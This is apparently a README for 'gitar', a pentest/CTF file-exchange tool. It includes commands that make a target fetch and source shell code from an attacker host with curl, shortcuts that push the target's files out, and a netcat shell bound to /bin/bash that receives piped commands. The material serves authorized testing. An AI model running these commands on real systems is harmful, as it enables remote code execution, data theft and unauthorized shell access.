<div align=center>
<h1>gitar</h1>
<img src=https://github.com/ariary/gitar/blob/main/img/gitar-logo.png width=150>
	
<strong>📡 A more sophisticated python HTTP server sibling <br>🎸 with even simpler interactions for file exchange (Pentest/CTF) </strong>
<br>
</div>

|![demo](https://github.com/ariary/gitar/blob/main/img/gitar-screen.png)|
|:---:|
|**~>** Have the  ***simplest possible shortcuts*** to upload/download file to/from the target machine<br>**~>** ***No installation needed*** on target machine<br>**~>** ***Fast and simple*** deployment|



## TL;DR *- and listen music*

On my target machine:
 - **Download a file** from my attacker machine: `pull [file]`
 - **Download a directory** from my attacker machine: `pullr [directory]`
 - **Upload a file** to my attacker machine: `push [file]`
 - **Upload a directory** to my attacker machine: `pushr [directory]`

*Before be able to use these shortcut you have to [set up](#set-up) both machines. Once again, the aim is to made it as simple as possible*

## Set up


### 🎸 Launch `gitar` server 
 
On **Attacker machine**: 
```shell
gitar
```

On **Target machine**:

```shell
# Get shortcuts and source them. The one-liner corresponding is by default copy on clipboard. 
# It is also provided by step 1. (in gitar output):
source <(curl -s http://[attacker_ip:port]/alias)
```

**And that's all, you can now `push` or `pull` file [🎶](#tldr---and-listen-music)**

 <sup>[`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files)</sup>

### 🐋 Secure launch of `gitar` server

 
This is basicaly the same as launching `gitar` server. But as we expose our http server we become the prey. Hence we must harden a bit the server. To do this we launch `gitar` inside a container and use HTTPS.

*To use container image, you have to built it from ` Dockerfile`: `make build.gitar.image`*

The following steps expose files of current directory. Files uploaded by remote are written inside current directory also.

On **Attacker machine**: 
```shell
docker run -it --rm --cap-drop=all --cap-add=dac_override --user $(id -u):$(id -g)  -v "${PWD}:/gitar/exchange" ariary/gitar
```

**You can now `push`or `pull` file being more safe [🎶](#tldr---and-listen-music)**



<sup>[`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files-safely)</sup>

### Pre-requisites

* HTTP Network connectivity between attacker & target machines
* On target machine: `curl` 
	* `tar` for directory upload 
* On attacker machine: 
	* `xclip` to copy command on clipboard (not required)
	* `tree`: to expose it trough server (not required)
	* `dig`: to automatically find extarnal IP (not required)

The aim is to keep "target requirements" as fit as possible. Attacker machine requirements are not a big deal as we have plenty control over it and time to configure it.

## Install

```shell
go install github.com/ariary/gitar@latest
```

## Bonus

### Bidirectional exchange

You can also use `push` and `pull` shortcuts from attacker machine. It does not require addtional requirements on both machines. To do so it is recommended to load `alias` (put them in your `~/[SHELL]rc`) and launch h gitar as follow:
```shell
gtrclean
gitar -bidi
```

On another attacker terminal window you can now push file to remote:
```shell
gtrbidi #to load gitar shortcut
push [FILENAME]
gtrclean #when you exchange is done
```

#### Limits
* Only work for file (does not work for `pullr` and `pushr`)
* Increase considerably the number of http requests on target
* 

### Load shortcut directly in your reverse shell

**~>** *Below are the steps to have shortcuts directly embedded in your `nc` reverse shell*

On **Target machine**:
```shell
# Launch your classic listener
nc -nvlp 4444 -e /bin/bash
```

On **Attacker machine**:

1. Launch `gitar`server : `gitar -e [server_reachable_ip]` *(By default this will copy on clipboard the command to set up gitar exchange, also available in server output)*
2. Connect to the reverse shell + load shortcut within:`nc [VICTIM_IP] 4444` then `[CTRL+V]` 

An alternative is `export CMD=[CTRL+V] && (echo $CMD && cat) | nc [VICTIM_IP] 4444` *(Note: with `cat` you will not benefit of bash completion)*

**And enjoy you revshell [🎶](#tldr---and-listen-music)**


	
	
